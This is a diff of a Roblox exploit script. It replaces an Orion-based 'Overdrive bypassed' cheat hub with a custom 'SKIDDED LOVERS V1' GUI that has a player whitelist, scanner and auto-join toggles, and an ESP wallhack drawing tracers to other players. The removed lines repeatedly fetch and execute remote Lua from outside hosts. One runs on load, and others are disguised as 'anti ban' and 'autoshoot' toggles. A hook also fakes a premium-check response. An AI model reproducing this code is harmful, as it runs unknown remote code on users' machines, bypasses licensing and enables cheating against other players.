@@ -1,68 +1,124 @@
-loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local camera = workspace.CurrentCamera
 
-local Window = OrionLib:MakeWindow({Name = "Overdrive bypassed", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
-local Tab = Window:MakeTab({
-    Name = "farming",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-Tab:AddButton({
-    Name = "autofarm script✅",
-    Callback = function()
-loadstring(game:HttpGet("https://overdrivehub.odh.workers.dev/?d=auth&script=mm2_lite"))()
-print("button pressed")
-      end 
-})
-Tab:AddToggle({
-    Name = "anti afk✅ (make sure to use one)",
-    Default = false,
-    Callback = function(Value)
-        print(Value)
+-- ==========================================
+-- SECURITY SECTION
+-- ==========================================
+local Whitelists = {
+    ["vpngeek"] = "OWNER",
+    ["YourUsernameHere"] = "OWNER", 
+}
+local userRole = Whitelists[player.Name] or "USER"
+-- ==========================================
+
+-- SETTINGS
+local PastebinID = "XybKK2cT" 
+local ScannerEnabled = false
+local AutoJoinEnabled = false
+local LastContent = ""
+
+-- STARTUP SOUND
+local startupSound = Instance.new("Sound", workspace)
+startupSound.SoundId = "rbxassetid://5476307813"
+startupSound:Play()
+
+-- UI Setup (No Animations)
+if player.PlayerGui:FindFirstChild("SkiddedLovers") then player.PlayerGui.SkiddedLovers:Destroy() end
+local sg = Instance.new("ScreenGui", player.PlayerGui)
+sg.Name = "SkiddedLovers"
+sg.ResetOnSpawn = false
+
+local main = Instance.new("Frame", sg)
+main.Size = UDim2.new(0, 480, 0, 310)
+main.Position = UDim2.new(0.5, -240, 0.5, -155)
+main.BackgroundColor3 = Color3.fromRGB(25, 27, 30)
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 15)
+
+-- RAINBOW ENGINE
+local stroke = Instance.new("UIStroke", main)
+stroke.Thickness = 3.5
+local CurrentRainbowColor = Color3.new(1,0,0)
+
+-- HEADER
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1, 0, 0, 40); title.Position = UDim2.new(0, 0, 0, 5)
+title.Text = "SKIDDED LOVERS V1"; title.TextColor3 = Color3.new(1, 1, 1)
+title.Font = Enum.Font.GothamBold; title.TextSize = 22; title.BackgroundTransparency = 1
+
+local userDisplay = Instance.new("TextLabel", main)
+userDisplay.Size = UDim2.new(1, 0, 0, 20); userDisplay.Position = UDim2.new(0, 0, 0, 40)
+userDisplay.Font = Enum.Font.GothamBold; userDisplay.TextSize = 15; userDisplay.BackgroundTransparency = 1
+userDisplay.Text = "Welcome, " .. player.Name .. " [" .. userRole .. "]"
+
+task.spawn(function()
+    while task.wait(0.03) do
+        local hue = (math.sin(tick() * 1.5) * 0.05) + 0.02
+        CurrentRainbowColor = Color3.fromHSV(hue < 0 and hue + 1 or hue, 0.8, 1)
+        stroke.Color = CurrentRainbowColor
+        userDisplay.TextColor3 = CurrentRainbowColor
     end
-})
-Tab:AddToggle({
-    Name = "anti ban",
-    Default = false,
-    Callback = function(Value)
-loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()
-        print(Value)
-    end
-})
-local Tab = Window:MakeTab({
-    Name = "Server hop",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-    })
-Tab:AddButton({
-    Name = "NOTE! NOT USING ANTI CAN RESULT IN BAN!",
-    Callback = function()
-              print("button pressed")
-      end
-        })
-Tab:AddToggle({
-    Name = "bypass ban",
-    Default = false,
-    Callback = function(Value)
-        print(Value)
-    end
-    })
-Tab:AddToggle({
-    Name = "New autoshoot + god mode (stable)",
-    Default = false,
-    Callback = function(Value)
-        print(Value)
-loadstring(game:HttpGet("https://egorikusa.space/26086df0d3d923ced7168d13.lua", true))()end
-})
-local httpHook;
-httpHook = hookfunction(game.HttpGet, function(self,...)
-   local Args = {...}
-   if Args[1] and type(Args[1]) == "string" then
-       if Args[1]:match("checkPremium.php") then
-           return "true"
-       end
-   end
-   return httpHook(self,...)
 end)
 
-local OrionLib = loadstring(game:HttpGet(('https://hypernite.xyz/Backup/Orion/source.lua')))() -- Backed up to my host
+-- LOG PANEL
+local logScroll = Instance.new("ScrollingFrame", main)
+logScroll.Size = UDim2.new(0, 240, 0, 180); logScroll.Position = UDim2.new(0.05, 0, 0.35, 0)
+logScroll.BackgroundColor3 = Color3.fromRGB(15, 17, 18); logScroll.BorderSizePixel = 0
+Instance.new("UICorner", logScroll)
+local logLayout = Instance.new("UIListLayout", logScroll)
+
+local function addLog(msg)
+    local l = Instance.new("TextLabel", logScroll)
+    l.Size = UDim2.new(1, -10, 0, 20); l.Text = " " .. msg; l.TextColor3 = Color3.fromRGB(200, 200, 200)
+    l.BackgroundTransparency = 1; l.Font = Enum.Font.Code; l.TextSize = 13
+    logScroll.CanvasSize = UDim2.new(0, 0, 0, logLayout.AbsoluteContentSize.Y)
+end
+
+-- BUTTON CREATION
+local function createBtn(text, pos)
+    local b = Instance.new("TextButton", main); b.Size = UDim2.new(0, 180, 0, 50); b.Position = pos; b.Text = text; b.BackgroundColor3 = Color3.fromRGB(50, 50, 60); b.TextColor3 = Color3.new(1, 1, 1); b.Font = Enum.Font.GothamBold; Instance.new("UICorner", b)
+    return b
+end
+
+local scanBtn = createBtn("SCANNER: OFF", UDim2.new(0.58, 0, 0.35, 0))
+local autoBtn = createBtn("AUTO JOIN: OFF", UDim2.new(0.58, 0, 0.55, 0))
+
+scanBtn.MouseButton1Click:Connect(function()
+    ScannerEnabled = not ScannerEnabled
+    scanBtn.Text = ScannerEnabled and "SCANNER: ON" or "SCANNER: OFF"
+    scanBtn.BackgroundColor3 = ScannerEnabled and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(50, 50, 60)
+end)
+
+autoBtn.MouseButton1Click:Connect(function()
+    AutoJoinEnabled = not AutoJoinEnabled
+    autoBtn.Text = AutoJoinEnabled and "AUTO JOIN: ON" or "AUTO JOIN: OFF"
+    autoBtn.BackgroundColor3 = AutoJoinEnabled and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(50, 50, 60)
+end)
+
+-- ACCURATE ESP SYSTEM
+local function CreateESP(targetPlayer)
+    local tracer = Drawing.new("Line")
+    tracer.Thickness = 1.5
+    local function ApplyHighlight(character)
+        local highlight = Instance.new("Highlight", character)
+        RunService.RenderStepped:Connect(function()
+            if not character or not character:FindFirstChild("HumanoidRootPart") or not highlight.Parent then tracer.Visible = false return end
+            highlight.FillColor = CurrentRainbowColor
+            highlight.OutlineColor = CurrentRainbowColor
+            local vector, onScreen = camera:WorldToViewportPoint(character.HumanoidRootPart.Position)
+            if onScreen then
+                tracer.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y)
+                tracer.To = Vector2.new(vector.X, vector.Y); tracer.Color = CurrentRainbowColor; tracer.Visible = true
+            else tracer.Visible = false end
+        end)
+    end
+    targetPlayer.CharacterAdded:Connect(ApplyHighlight)
+    if targetPlayer.Character then ApplyHighlight(targetPlayer.Character) end
+end
+
+for _, p in pairs(Players:GetPlayers()) do if p ~= player then CreateESP(p) end end
+Players.PlayerAdded:Connect(function(p) if p ~= player then CreateESP(p) end end)
+
+addLog("Security Check Passed.")
